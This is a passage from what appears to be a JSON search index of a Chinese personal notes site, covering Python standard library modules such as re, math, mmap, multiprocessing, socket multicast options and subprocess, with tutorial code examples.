re.match(r\"c:\\\\a\",mm).group() print(ret)#c:\\a ret = re.match(r\"c:\\a\",mm).group() print(ret)#AttributeError: 'NoneType' object has no attribute 'group' 正则匹配规则(基本适用所有语言) 匹配单个字符 字符 功能 位置 . 匹配任意1个字符（除了n） [ ] 匹配[ ]中列举的字符 d 匹配数字，即0-9 可以写在字符集[...]中 D 匹配⾮数字，即不是数字 可以写在字符集[...]中 s 匹配空⽩，即空格，tab键 可以写在字符集[...]中 S 匹配⾮空⽩字符 可以写在字符集[...]中 w 匹配单词字符，即a-z、A-Z、0-9、_ 可以写在字符集[...]中 W 匹配⾮单词字符 可以写在字符集[...]中 使用括号匹配的内容, 可以用 \\1 , \\2 表示, 如: In [17]: re.sub(r'([a-z]+)([A-Z)]+)', r'\\1_\\2', 'distributeType').lower() Out[17]: 'distribute_type' # 这里不懂为什么加不加 + 一样 # todo: + In [18]: re.sub(r'([a-z])([A-Z)])', r'\\1_\\2', 'distributeType').lower() Out[18]: 'distribute_type' \\s ：表示匹配空白字符，包括空格、制表符、换行符等。它与[rntfv ]等效。 \\b ：表示匹配单词边界。一个单词被定义为由字母或数字组成的字符序列。b匹配位于单词开头或结尾的位置，而不匹配任何实际字符。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-hot.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-hot.html"},{"title":"html","text":"官网: html --- 超文本标记语言支持 该模块定义了操作HTML的工具。 html 包中的子模块是： html.parser —— 具有宽松解析模式的HTML / XHTML解析器 html.entities -- HTML 实体定义 html.parser 官网: https://docs.python.org/zh-cn/3/library/html.parser.html#module-html.parser 简单的 HTML 和 XHTML 解析器 这个模块定义了一个 HTMLParser 类，为 HTML（超文本标记语言）和 XHTML 文本文件解析提供基础。 html.entities HTML 一般实体的定义 该模块定义了四个词典， html5、 name2codepoint、 codepoint2name、以及 entitydefs。 html.entities.html5 将 HTML5 命名字符引用 1 映射到等效的 Unicode 字符的字典，例如 html5['gt;'] == '>'。 请注意，尾随的分号包含在名称中（例如 'gt;' ），但是即使没有分号，一些名称也会被标准接受， 在这种情况下，名称出现时带有和不带有 ';'。另见 html.unescape()。 3.3 新版功能. html.entities.entitydefs 将 XHTML 1.0 实体定义映射到 ISO Latin-1 中的替换文本的字典。 html.entities.name2codepoint 将 HTML 实体名称映射到 Unicode 代码点的字典。 html.entities.codepoint2name 将 Unicode 代码点映射到 HTML 实体名称的字典。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-html.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-html.html"},{"title":"inspect","text":"inspect.signature 可进行参数检查","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-inspect.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-inspect.html"},{"title":"math","text":"官网: math --- 数学函数 该模块提供了对C标准定义的数学函数的访问。 这些函数不适用于复数；如果你需要计算复数，请使用 /docs/后端/python/python标准库/cmath 模块中的同名函数。 将支持计算复数的函数区分开的目的，来自于大多数开发者并不愿意像数学家一样需要学习复数的概念。 得到一个异常而不是一个复数结果使得开发者能够更早地监测到传递给这些函数的参数中包含复数，进而调查其产生的原因。 该模块提供了以下函数。除非另有明确说明，否则所有返回值均为浮点数。 数论与表示函数 注意 frexp() 和 modf() 具有与它们的C等价函数不同的调用/返回模式： 它们采用单个参数并返回一对值，而不是通过 '输出形参' 返回它们的第二个返回参数（Python中没有这样的东西）。 对于 ceil() ， floor() 和 modf() 函数，请注意 所有 足够大的浮点数都是精确整数。 Python浮点数通常不超过53位的精度（与平台C double类型相同），在这种情况下，任何浮点 x 与 abs(x) >= 2**52 必然没有小数位。 幂函数与对数函数 三角函数 角度转换 双曲函数 双曲函数 是基于双曲线而非圆来对三角函数进行模拟。 特殊函数 常量 math.pi: 数学常数 π = 3.141592...，精确到可用精度。 math.e: 数学常数 e = 2.718281...，精确到可用精度。 math.tau: 数学常数 τ = 6.283185...，精确到可用精度。 Tau 是一个圆周常数，等于 2π，圆的周长与半径之比。 更多关于 Tau 的信息可参考 Vi Hart 的视频 Pi is (still) Wrong。吃两倍多的派来庆祝 Tau 日 吧！ 3.6 新版功能. math.inf: 浮点正无穷大。 （对于负无穷大，使用 -math.inf 。）相当于 float('inf') 的输出。 3.5 新版功能. math.nan: 一个浮点的 \"非数字\"（NaN）值。相当于 float('nan') 的输出。 由于 IEEE-754标准 的要求， math.nan 和 float('nan') 不被认为等于任何其他数值，包括其本身。 要检查一个数字是否为NaN，请使用 isnan() 函数来测试 NaN ，而不是 is 或 == 。 例子: >>> import math math.nan == math.nan False float('nan') == float('nan') False math.isnan(math.nan) True math.isnan(float('nan')) True 在 3.11 版更改: It is now always available. 3.5 新版功能. CPython 实现细节 math 模块主要包含围绕平台C数学库函数的简单包装器。 特殊情况下的行为在适当情况下遵循C99标准的附录F。 当前的实现将引发 ValueError 用于无效操作，如 sqrt(-1.0) 或 log(0.0) （其中C99附件F建议发出无效操作信号或被零除）， 和 OverflowError 用于溢出的结果（例如， exp(1000.0) ）。 除非一个或多个输入参数是NaN，否则不会从上述任何函数返回NaN； 在这种情况下，大多数函数将返回一个NaN，但是（再次遵循C99附件F）这个规则有一些例外， 例如 pow(float('nan'), 0.0) 或 hypot(float('nan'), float('inf')) 。 请注意，Python不会将显式NaN与静默NaN区分开来，并且显式NaN的行为仍未明确。典型的行为是将所有NaN视为静默的。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-math.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-math.html"},{"title":"mmap","text":"官网文档:: mmap - 内存映射文件支持 部分参考:: Python多进程（2）——mmap模块与mmap对象 创建内存映射的文件对象. 类似于file打开的文件对象的操作, 同时又支持了字节数组的一些操作如切片. 通俗来说就是创建一个存在于内存的文件(个人观点). 与 string 的区别是: mmap 对象不提供字符串对象的方法； mmap 对象是可变的, 而 str 对象是不可变的 mmap 对象同时对应于打开的文件, 多态于一个Python file 对象 mmap 对象可以切片和索引, 也可以为它的切片或索引赋值（因为 mmap 对象是可变的）, 为 mmap 对象的切片赋值时, 赋值语句右值的长度必须和左值切片的长度相同. mmap 对象可以作为进程间通过文件进行 IPC 的一种替换手段. mmap类 定义 windows版本 unix版本 参数 fileno: 文件描述符(句柄), 可以是 -1 这种, 也可以 open().fileno() length: int 将指定 fileno 的前 length 字节映射到内存. 映射的内容字节长度, 为0则表示映射整个文件. 如果 length 大于当前文件大小, 则文件将扩展为包含 length 个字节. 如果 length 为 0, 则映射的最大长度为当前文件大小. 如果文件为空, Windows 会引发异常（你无法在Windows上创建空映射）. tagname=None platform: windows . 如果 tagname 被指定且不是 None , 则是为映射提供标签名称的字符串(为一段内存映射指定名称). Windows 允许你对同一文件拥有许多不同的映射(一个文件上面可以同时具有多个 mmap). 如果指定现有标签的名称, 则会打开该标签, 否则将创建该名称的新标签. 如果省略此参数或设置为 None , 则创建的映射不带名称. 避免使用 tag 参数将有助于使代码在Unix和Windows之间可移植. flags=MAP_SHARED platform: unix . flags 指明映射的性质. MAP_PRIVATE 会创建私有的写入时拷贝映射, 因此对 mmap 对象内容的修改将为该进程所私有. MAP_SHARED 会创建与其他映射同一文件区域的进程所共享的映射. 默认值为 MAP_SHARED. prot=PROT_WRITE|PROT_READ platform: unix . 如果指明了 prot, 它将给出所需的内存保护方式； 最有用的两个值是 PROT_READ 和 PROT_WRITE, 分别指明页面为可读或可写. prot 默认为 PROT_READ | PROT_WRITE (可读可写). access=ACCESS_DEFAULT[, offset]) 在unix下, 可以指定 access 作为替代 flags 和 prot 的可选关键字形参. 同时指定 flags, prot 和 access 将导致错误. 对于所有平台: 可以将 access 指定为可选的关键字参数. access 接受以下四个值之一: ACCESS_READ 指定只读. 向 ACCESS_READ 内存映射赋值会引发 TypeError 异常. ACCESS_WRITE 指定只写. 向 ACCESS_WRITE 内存映射赋值会影响内存和底层的文件. ACCESS_COPY 指定写时复制内存. 向 ACCESS_COPY 内存映射赋值会影响内存, 但不会更新底层的文件. ACCESS_DEFAULT 推迟到 prot access 可以在 Unix 和 Windows 上使用. 如果未指定 access , 则 Windows mmap 返回只写映射. 这三种访问类型的初始内存值均取自指定的文件. offset 可以被指定为非负整数偏移量. mmap 引用将相对于从文件开头的偏移. offset 默认为0. offeset 必须是 ALLOCATIONGRANULARITY 的倍数. 注意: 创建 mmap 将会引发一个 审计事件 mmap.__new__ 附带参数 fileno, length, access, offset. mmap 对象的方法 对于EOF的处理, write() 和 read_byte() 抛出异常 ValueError, 而 write_byte() 和 read() 什么都不做.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-mmap.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-mmap.html"},{"title":"multiprocessing","text":"官网文档:: multiprocessing Python中多进程是相互执行互不干扰的，但是如果多进程之间需要对同一资源对象进行操作或者多个进程之间有相互依赖的， 那就需要一个共享变量供多进程使用。 Python multiprocessing 多进程之间相互协调的方式有如下几种: Lock: 锁 Queue: 队列 Semaphore: 信号量 Event: 事件 Pipe: 管道 Process 支持三种启动进程的方法 spawn 父进程启动一个新的Python解释器进程。 子进程将只继承运行Process对象的run()方法所需的资源。 不会继承来自父进程的不必要的文件描述符和句柄。与使用fork或forkserver相比，使用此方法启动进程相当慢。 可在 Unix 和 Windows 上使用。 Windows 和 macOS 上的默认设置。 fork 父进程使用 os.fork() 来产生 Python 解释器分叉。子进程在开始时实际上与父进程相同。父进程的所有资源都由子进程继承。请注意，安全分叉多线程进程是棘手的。 只存在于 Unix。 Unix 中的默认值。 forkserver 程序启动并选择 forkserver 启动方法时，将启动服务器进程。 从那时起，每当需要一个新进程时，父进程就会连接到服务器并请求它分叉一个新进程。 分叉服务器进程是单线程的，因此使用 os.fork() 是安全的。 没有不必要的资源被继承。 可在Unix平台上使用，支持通过Unix管道传递文件描述符。 如要更改, 在执行之前使用: import multiprocessing as mp mp.set_start_method('spawn') 进程之间交换对象 multiprocessing 支持进程之间的两种通信通道： 队列 管道 队列 Queue 类是一个近似 queue.Queue 的克隆。 例如: from multiprocessing import Process, Queue def f(q): q.put([42, None, 'hello']) if __name__ == '__main__': q = Queue() p = Process(target=f, args=(q,)) p.start() print(q.get()) # prints \"[42, None, 'hello']\" p.join() 队列是线程和进程安全的。 管道 Pipe() 函数返回一个由管道连接的连接对象，默认情况下是双工（双向）。例如: from multiprocessing import Process, Pipe def f(conn): conn.send([42, None, 'hello']) conn.close() if __name__ == '__main__': parent_conn, child_conn = Pipe() p = Process(target=f, args=(child_conn,)) p.start() print(parent_conn.recv()) # prints \"[42, None, 'hello']\" p.join() 返回的两个连接对象 Pipe() 表示管道的两端。每个连接对象都有 send() 和 recv() 方法（相互之间的）。请注意，如果两个进程（或线程）同时尝试读取或写入管道的 同一 端，则管道中的数据可能会损坏。当然，在不同进程中同时使用管道的不同端的情况下不存在损坏的风险。 进程间同步 multiprocessing 包含来自 threading 的所有同步原语的等价物。例如，可以使用锁来确保一次只有一个进程打印到标准输出: from multiprocessing import Process, Lock def f(l, i): l.acquire() try: print('hello world', i) finally: l.release() if __name__ == '__main__': lock = Lock() for num in range(10): Process(target=f, args=(lock, num)).start() 不使用锁的情况下，来自于多进程的输出很容易产生混淆。 进程间共享状态 如上所述，在进行并发编程时，通常最好尽量避免使用共享状态。使用多个进程时尤其如此。 但是，如果你真的需要使用一些共享数据，那么 multiprocessing 提供了两种方法。 共享内存 可以使用 Value 或 Array 将数据存储在共享内存映射中。例如，以下代码: from multiprocessing import Process, Value, Array def f(n, a): n.value = 3.1415927 for i in range(len(a)): a[i] = -a[i] if __name__ == '__main__': num = Value('d', 0.0) arr = Array('i', range(10)) p = Process(target=f, args=(num, arr)) p.start() p.join() print(num.value) print(arr[:]) 将打印: 3.1415927 [0, -1, -2, -3, -4, -5, -6, -7, -8, -9] 创建 num 和 arr 时使用的 'd' 和 'i' 参数是 array 模块使用的类型的 typecode ： 'd' 表示双精度浮点数， 'i' 表示有符号整数。这些共享对象将是进程和线程安全的。 为了更灵活地使用共享内存，可以使用 multiprocessing.sharedctypes 模块，该模块支持创建从共享内存分配的任意ctypes对象。 服务进程 由 Manager() 返回的管理器对象控制一个服务进程，该进程保存Python对象并允许其他进程使用代理操作它们。 Manager() 返回的管理器支持类型: list dict Namespace Lock RLock Semaphore BoundedSemaphore Condition Event Barrier Queue Value Array 例如: from multiprocessing import Process, Manager def f(d, l): d[1] = '1' d['2'] = 2 d[0.25] = None l.reverse() if __name__ == '__main__': with Manager() as manager: d = manager.dict() l = manager.list(range(10)) p = Process(target=f, args=(d, l)) p.start() p.join() print(d) print(l) 将打印: {0.25: None, 1: '1', '2': 2} [9, 8, 7, 6, 5, 4, 3, 2, 1, 0] 使用服务进程的管理器比使用共享内存对象更灵活，因为它们可以支持任意对象类型。 此外，单个管理器可以通过网络由不同计算机上的进程共享。但是，它们比使用共享内存慢。 使用工作进程 Process对象的一些属性/方法 start() 启动进程活动。 这个方法每个进程对象最多只能调用一次。它会将对象的 run() 方法安排在一个单独的进程中调用。 join([timeout]) 如果可选参数 timeout 是 None （默认值），则该方法将阻塞，直到调用 join() 方法的进程终止。如果 timeout 是一个正数，它最多会阻塞 timeout 秒。请注意，如果进程终止或方法超时，则该方法返回 None 。检查进程的 exitcode 以确定它是否终止。 一个进程可以被 join 多次。 进程无法join自身，因为这会导致死锁。尝试在启动进程之前join进程是错误的。 name 进程的名称。该名称是一个字符串，仅用于识别目的。它没有语义。可以为多个进程指定相同的名称。 初始名称由构造器设定。 如果没有为构造器提供显式名称，则会构造一个形式为 'Process-N1:N2:...:Nk' 的名称，其中每个 Nk 是其父亲的第 N 个孩子。 is_alive() 返回进程是否还活着。 粗略地说，从 start() 方法返回到子进程终止之前，进程对象仍处于活动状态。 daemon 进程的守护标志，一个布尔值。这必须在 start() 被调用之前设置。 初始值继承自创建进程。 当进程退出时，它会尝试终止其所有守护进程子进程。 请注意，不允许在守护进程中创建子进程。这是因为当守护进程由于父进程退出而中断时，其子进程会变成孤儿进程。 另外，这些 不是 Unix 守护进程或服务，它们是正常进程，如果非守护进程已经退出，它们将被终止（并且不被合并）。 pid 返回进程ID。在生成该进程之前，这将是 None 。 exitcode 子进程的退出代码。如果该进程尚未终止则为 None 。 如果子进程的 run() 方法正常返回，退出代码将是 0 。 如果它通过 sys.exit() 终止，并有一个整数参数 N ，退出代码将是 N 。 如果子进程由于在 run() 内的未捕获异常而终止，退出代码将是 1 。 如果它是由信号 N 终止的，退出代码将是负值 -N 。 sentinel 系统对象的数字句柄，当进程结束时将变为 \"ready\" 。 如果要使用 multiprocessing.connection.wait() 一次等待多个事件，可以使用此值。否则调用 join() 更简单。 在Windows上，这是一个操作系统句柄，可以与 WaitForSingleObject 和 WaitForMultipleObjects 系列API调用一起使用。在Unix上，这是一个文件描述符，可以使用来自 select 模块的原语。 3.3 新版功能. terminate() 终止进程。 在Unix上，这是使用 SIGTERM 信号完成的；在Windows上使用 TerminateProcess() 。 请注意，不会执行退出处理程序和finally子句等。 请注意，进程的后代进程将不会被终止 —— 它们将简单地变成孤立的。 警告 如果在关联进程使用管道或队列时使用此方法，则管道或队列可能会损坏，并可能无法被其他进程使用。 类似地，如果进程已获得锁或信号量等，则终止它可能导致其他进程死锁。 kill() 与 terminate() 相同，但在Unix上使用 SIGKILL 信号。 close() 关闭 Process 对象，释放与之关联的所有资源。如果底层进程仍在运行，则会引发 ValueError 。一旦 close() 成功返回， Process 对象的大多数其他方法和属性将引发 ValueError 。 注解 注意 start() 、 join() 、 is_alive() 、 terminate() 和 exitcode 方法只能由创建进程对象的进程调用。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-multiprocessing.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-multiprocessing.html"},{"title":"operator","text":"两个便捷使用的操作: import operator operator.itemgetter <class 'operator.itemgetter'> operator.attrgetter <class 'operator.attrgetter'> itemgetter, 便捷获取字典属性 attrgetter, 便捷获取对象属性 itemgetter 有一个字典列表，你想根据某个或某几个字典字段来排序这个列表: rows = [ {'fname': 'Brian', 'lname': 'Jones', 'uid': 1003}, {'fname': 'David', 'lname': 'Beazley', 'uid': 1002}, {'fname': 'John', 'lname': 'Cleese', 'uid': 1001}, {'fname': 'Big', 'lname': 'Jones', 'uid': 1004} ] from operator import itemgetter rows_by_fname = sorted(rows, key=itemgetter('fname')) rows_by_uid = sorted(rows, key=itemgetter('uid')) 也支持多个 keys，比如下面的代码: rows_by_lfname = sorted(rows, key=itemgetter('lname','fname')) print(rows_by_lfname) 也可以用 lambda 表达式代替，比如: rows_by_fname = sorted(rows, key=lambda r: r['fname']) rows_by_lfname = sorted(rows, key=lambda r: (r['lname'],r['fname'])) 但是效率较低 attrgetter 与上类似. 支持的是自定义对象 总览 部分总览: operator.lt(a, b) operator.le(a, b) operator.eq(a, b) operator.ne(a, b) operator.ge(a, b) operator.gt(a, b) operator.__lt__(a, b) operator.__le__(a, b) operator.__eq__(a, b) operator.__ne__(a, b) operator.__ge__(a, b) operator.__gt__(a, b)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-operator.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-operator.html"},{"title":"pprint","text":"pprint --- 数据美化输出 官网: https://docs.python.org/zh-cn/3/library/pprint.html 针对 json 格式数据的美化打印工具 pprint 模块提供了\"美化打印\"任意 Python 数据结构的功能，这种美化形式可用作对解释器的输入。 如果经格式化的结构包含非基本 Python 类型的对象，则其美化形式可能无法被加载。 包含文件、套接字或类对象，以及许多其他不能用 Python 字面值来表示的对象都有可能导致这样的结果。 PrettyPrinter","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-pprint.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-pprint.html"},{"title":"pytz","text":"时区操作的库","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-pytz.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-pytz.html"},{"title":"random","text":"官网: https://docs.python.org/zh-cn/3/library/random.html 生成伪随机数 该模块实现了各种分布的伪随机数生成器。 对于整数，从范围中有统一的选择。 对于序列，存在随机元素的统一选择、用于生成列表的随机排列的函数、以及用于随机抽样而无需替换的函数。 在实数轴上，有计算均匀、正态（高斯）、对数正态、负指数、伽马和贝塔分布的函数。 为了生成角度分布，可以使用 von Mises 分布。 这个模块提供的函数实际上是 random.Random 类的隐藏实例的绑定方法。 你可以实例化自己的 Random 类实例以获取不共享状态的生成器。 random 模块还提供 SystemRandom 类，它使用系统函数 os.urandom() 从操作系统提供的源生成随机数。 警告 不应将此模块的伪随机生成器用于安全目的。 有关安全性或加密用途，请参阅 /docs/后端/python/python标准库/secrets 模块。 功能/状态 用于字节数据的函数 整数用函数 返回随机整数 N 满足 a <= N <= b。相当于 randrange(a, b+1)。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-random.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-random.html"},{"title":"resource","text":"官网: https://docs.python.org/zh-cn/3/library/resource.html 资源使用信息 该模块提供了测量和控制程序所利用的系统资源的基本机制。 资源限制 资源的使用可以通过下面描述的 setrlimit() 函数来限制。每个资源都被一对限制所控制： 一个软限制和一个硬限制。软限制是当前的限制，并且可以由一个进程随着时间的推移而降低或提高。 软限制永远不能超过硬限制。硬限制可以降低到大于软限制的任何数值，但不能提高。 （只有拥有超级用户有效UID的进程才能提高硬限制。) 可以被限制的具体资源取决于系统。它们在 man getrlimit(2) 中描述。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-resource.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-resource.html"},{"title":"shutil","text":"官网: https://docs.python.org/zh-cn/3/library/shutil.html 高阶文件操作 shutil 模块提供了一系列对文件和文件集合的高阶操作。 特别是提供了一些支持文件拷贝和删除的函数。 对于单个文件的操作，请参阅 os 模块。 一些常用 copy, 文件的复制, 复制时, 如果是软链, 会自动找到真实的源文件, 然后把源文件复制过来, 新的文件名与软链名保持一致, 可使用 follow_symlinks=False 达到与 copy2 一致 copy2, 文件的复制, 复制时, 如果是软链, 仅复制此软链 copy_tree, 目录的复制","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-shutil.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-shutil.html"},{"title":"site","text":"官网: https://docs.python.org/zh-cn/3/library/site.html 获取本地三方包路径: $ python3 -m site --user-site /home/user/.local/lib/python3.3/site-packages --user-base 输出用户基本的路径。 --user-site 输出用户site-packages目录的路径。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-site.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-site.html"},{"title":"socket","text":"官网: https://docs.python.org/zh-cn/3/library/socket.html 底层网络接口 提供了访问 BSD 套接字 的接口。在所有现代 Unix 系统、Windows、macOS 和其他一些平台上可用。 套接字协议簇 仅介绍常用的 ipv4与ipv6相关地址协议簇 一对 (host, port) 被用作 AF_INET 地址族，其中 host 是一个表示互联网域名标记形式的主机名例如 'daring.cwi.nl' 或者 IPv4 地址例如 '100.50.200.5' 的字符串，而 port 是一个整数值。 对于 IPv4 地址，有两种可接受的特殊形式被用来代替一个主机地址：'' 代表 INADDR_ANY，用来绑定到所有接口； 字符串 '<broadcast>' 代表 INADDR_BROADCAST。 此行为不兼容 IPv6，因此，如果你的 Python 程序打算支持 IPv6，则可能需要避开这些。 对于 AF_INET6 地址族，使用一个四元组 (host, port, flowinfo, scope_id)， 其中 flowinfo 和 scope_id 代表了 C 库 struct sockaddr_in6 中的 sin6_flowinfo 和 sin6_scope_id 成员。 对于 socket 模块中的方法， flowinfo 和 scope_id 可以被省略，只为了向后兼容。 注意，省略 scope_id 可能会导致操作带有领域 (Scope) 的 IPv6 地址时出错。 setsockopt setsockopt()方法用来设置套接字选项,它有以下参数: level:选项级别,用于区分是针对套接字级别的选项还是某个具体协议级别的选项。socket.SOL_SOCKET表示套接字级别。 optname:选项名称, 如socket.SO_BROADCAST,表示广播选项。 支持的值: level为SOL_SOCKET:设置套接字级别的选项。包括: SO_REUSEADDR:允许重用本地地址和端口。 比如当上一个套接字关闭时立即再启动, 会发现报错端口已占用. 这是因为上一次关闭时, 其处于 TIME_WAIT 状态，无法立即重用, 设置此选项即可立即重用. SO_REUSEPORT: 允许多个套接字绑定到同一个地址和端口。 普通的套接字绑定要求地址和端口必须是唯一的。如果有两个套接字尝试绑定到同一地址和端口,第二个绑定调用将失败。 SO_KEEPALIVE:开启TCP keepalive机制。 SO_SNDBUF / SO_RCVBUF:设置发送/接收缓冲区大小。 SO_LINGER:控制套接字关闭时未发送的数据。 SO_OOBINLINE:允许接收带外数据。 SO_BROADCAST: 允许套接字发送广播数据包。这在编写基于UDP的广播程序时需要设置 SO_ERROR: 获取或设置套接字的错误状态。当一个套接字出现错误时，它将返回一个非零值，表示该套接字上发生了错误。 这个错误状态可以通过 socket.getsockopt() 和 socket.setsockopt() 来获取和设置。 常见的错误状态包括连接被拒绝、超时、主机名无法解析等 level为IPPROTO_IP / IPPROTO_TCP:设置IP/TCP级别的选项。包括: IP_TOS:设置IP数据包的服务类型。 TCP_NODELAY:禁用Nagle算法,立即发送数据。 IP_MULTICAST_TTL: 设置IP多播数据包的存活时间TTL。它控制多播数据包可以跨过的路由器数量. IP_MULTICAST_TTL选项的值确实只能在0到255之间。 它表示IP多播数据包可以跨越的路由器数量。每个路由器跨越时,该值减一。当值减至0时,该数据包将不再被转发。 所以,该选项的值越大,多播数据包可以传输的距离越远。常用的值有: 1:同一子网内。只允许多播数据包在本地网络内传输。 32:同一站点内。允许跨越较大范围,可覆盖大多数机房或校园网。 64:同一地域内。可以覆盖较大范围的地区网络。 128或更大:更广范围的覆盖,甚至跨洲际。 而0值表示禁止多播数据包转发,它将被丢弃而不离开本地主机。 所以,对于这个选项,推荐的值一般为: 1-32:局域网/机房内多播。 64-128:广域网多播。 0:禁止多播数据包转发,本地回环。 正确设置这个值,可以控制多播数据包的传播范围,实现我们想要的多播覆盖面。 eg, 当值为2时: 表示多播数据包可以在当前子网及直接相邻的一个子网传输,但不允许传输到更远的网络。 它允许包括第一个跨路由器跳跃在内的两次路由。当IP多播数据包离开源主机后,它可以跨越第一个路由器,此时TTL值减一变为1。 然后在第二个路由器,TTL值再减一变为0。此时,该路由器将不再转发这个数据包,且将其丢弃。 IP_MULTICAST_LOOP: 控制是否向本地套接字发送回环多播数据包。 默认情况下,IP多播数据包会回环到本地,但在某些情况下我们需要禁用此功能。 IPPROTO_IPV6:设置IPv6相关的选项。 value:选项值,1表示允许,0表示禁止。 如允许UDP套接字udp_server发送和接收广播数据包: udp_server.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) 如果不设置这个选项,默认情况下套接字是不允许广播的。设置后,套接字可以: 使用udp_server.sendto(data, (\"<broadcast>\", port)) 发送广播 使用udp_server.recvfrom(bufsize) 接收广播 eg: # 设置socket选项，开启广播模式 # 允许地址重用, 可以在同一个端口上绑定多个套接字 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1) # 启用广播模式，可以向本地网络中的所有主机发送广播消息 sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) # 值设置为2，表示传输范围为本地子网， # 也就是说，UDP数据包只会被发送到与本地网络相连的主机 sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2) # 值设置为1, 启用IP多播回送功能，允许主机接收自己发送的IP多播数据报 sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1) # 绑定IP地址和端口号 sock.bind(cls._SSDP_Addr) # 加入多播组 # group变量存储多播地址, inet_aton()方法将其转换为二进制格式 group = socket.inet_aton(cls._SSDP_Addr[0]) # 将该地址和INADDR_ANY一起打包 mreq = struct.pack('4sL', group, socket.INADDR_ANY) # 将socket加入到指定的多播组中 sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) inet_aton 一些常量 socket.INADDR_ANY: 一个常用的特殊值,它表示: 0.0.0.0, 即所有本地IP地址。 socket.IP_ADD_MEMBERSHIP: 让套接字加入指定的IP多播组,从而接收该组的数据包 socket.SOCK_DGRAM表示使用UDP数据报套接字。 socket.AF_INET表示使用IPv4地址族。 将udp-socket加入多播组 加入多播组 group变量存储多播地址, inet_aton()方法将其转换为二进制格式: group = socket.inet_aton(cls._SSDP_Addr[0]) 将该地址和INADDR_ANY一起打包成一个4字节字符串加一个4/8字节整数,总长度为8/12字节: mreq = struct.pack('4sL', group, socket.INADDR_ANY) 4s:4个字符,使用s表示。这将打包成4个字节的字符串 L:1个长整型(long integer),使用L表示。这将打包成4字节(32位)或8字节(64位)的整数,取决于平台 将socket加入到指定的多播组中: sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) socket的recvfrom与recv区别 参数个数 recvfrom(bufsize, flags) 接收数据并包含发送方地址信息。 recv(bufsize, flags) 仅接收数据,不包含发送方地址信息。 返回值 recvfrom() 返回值是(data, address)。包含接收的数据和发送方地址。 recv() 返回值只有接收的数据data。 使用场景 recvfrom() Typically used on UDP sockets where sender address matters. 通常用于UDP套接字,需要获取发送方地址信息。 recv() Typically used on TCP sockets where sender address does not matter. 通常用于TCP套接字,不需要获取发送方地址信息。 总结 如果是TCP套接字,或者发送方地址信息不重要,使用recv()。 如果是UDP套接字,或者需要获取发送方地址信息,使用recvfrom()。 参考: socket-底层网络接口 说明 recv(bufsize, flags) 的bufsize决定一次能接受多少数据, send也是, 如果数据量大 建议将大数据分成多次循环发送.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-socket.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-socket.html"},{"title":"socketserver","text":"用于简化网络服务端编写的类。(简化socket开发)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-socketserver.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-socketserver.html"},{"title":"struct","text":"与c底层数据做转换, 设计到了字节, 大小端, 数据流等的知识 常用函数: pack(fmt,v1,v2…) 返回string. 按照给定的格式(fmt),把数据转换成字符串(字节流),并将该字符串返回. unpack(fmt,v1,v2…..) 返回tuple. 按照给定的格式(fmt)解析字节流,并返回解析结果 calcsize(fmt) 返回size of fmt. 计算给定的格式(fmt)占用多少字节的内存，注意对齐方式 详情参见:: https://blog.csdn.net/qq_30638831/article/details/80421019","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-struct.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-struct.html"},{"title":"subprocess","text":"call check_call 例, check_call()正常执行命令: >>> import subprocess >>> p = subprocess.check_call(['ping', '-c', '2', 'www.baidu.com']) PING www.baidu.com (39.156.66.14): 56 data bytes 64 bytes from 39.156.66.14: icmp_seq=0 ttl=52 time=40.865 ms 64 bytes from 39.156.66.14: icmp_seq=1 ttl=52 time=48.753 ms --- www.baidu.com ping statistics --- 2 packets transmitted, 2 packets received, 0.0% packet loss round-trip min/avg/max/stddev = 40.865/44.809/48.753/3.944 ms >>> p 0 例, check_call()错误执行命令: >>> p = subprocess.check_call(['ping', '-c', '2', 'www.xxxxxdu.com']) ping: cannot resolve www.xxxxxdu.com: Unknown host Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 373, in check_call raise CalledProcessError(retcode, cmd) subprocess.CalledProcessError: Command '['ping', '-c', '2', 